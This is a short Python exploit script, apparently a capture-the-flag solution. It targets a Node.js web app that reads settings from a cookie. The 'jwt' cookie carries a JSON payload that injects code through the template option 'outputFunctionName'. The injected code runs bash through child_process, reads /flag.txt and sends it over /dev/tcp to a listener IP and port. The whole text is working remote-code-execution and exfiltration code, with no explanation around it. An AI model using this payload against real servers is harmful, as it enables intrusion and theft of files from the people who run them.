#!/usr/bin/env python3

import requests

serverUrl = "http://localhost:3000"

myServerIp = "127.0.0.1"
myServerPort = "8080"

cmd = "cat /flag.txt > /dev/tcp/{}/{}".format(myServerIp, myServerPort)

payload  = """j:{"message":"foo", "settings":{"view options": {"outputFunctionName": "x%3bprocess.mainModule.require('child_process').exec('bash -c \\\"""" + cmd + """\\\"')%3bx"}}}"""

requests.get(serverUrl, cookies={"jwt": payload})
